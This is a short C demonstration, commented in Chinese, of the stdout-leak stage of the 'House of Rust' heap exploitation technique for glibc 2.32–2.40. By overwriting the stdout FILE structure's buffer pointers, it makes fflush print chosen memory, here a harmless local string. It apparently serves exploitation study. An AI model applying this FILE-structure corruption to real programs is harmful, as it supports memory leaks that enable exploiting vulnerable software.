/*
 * House of Rust 第四阶段的 stdout 泄漏，适用于 glibc 2.32～2.40。
 *
 * 输入原语：前一阶段已经用一次编辑覆盖了 _IO_2_1_stdout_。
 * 成功判据：fflush 会把 secret 所在的内存直接打印到标准输出。
 *
 * 本文件只演示 FILE 结构体被消费的过程，不重复前面 TSU/largebin 的投递步骤。
 */

#include <assert.h>
#include <stdio.h>
#include <unistd.h>

int main(void)
{
    static char secret[] = "[+] stdout 泄漏成功\n";

    /* 先清空 stdout 原来还没输出的内容。 */
    assert(fflush(stdout) == 0);

    /*
     * fflush 会输出 [write_base, write_ptr) 这个区间的内容。
     * 所以把这两个字段分别指向 secret 的开头和结尾。
     */
    stdout->_IO_write_base = secret;
    stdout->_IO_write_ptr = secret + sizeof(secret) - 1;
    stdout->_IO_write_end = secret + sizeof(secret) - 1;

    /* read_end 设成和 write_base 一样，避免在真正输出到 pipe/终端前尝试调整文件偏移。 */
    stdout->_IO_read_end = secret;

    /* 缓冲区的边界也一并覆盖成同一段可读内存。 */
    stdout->_IO_buf_base = secret;
    stdout->_IO_buf_end = secret + sizeof(secret) - 1;

    /* 这次 fflush 才是真正触发泄漏的那一步。 */
    assert(fflush(stdout) == 0);

    /* stdout 已经被破坏了，这里不做恢复，直接退出即可。 */
    _exit(0);
}
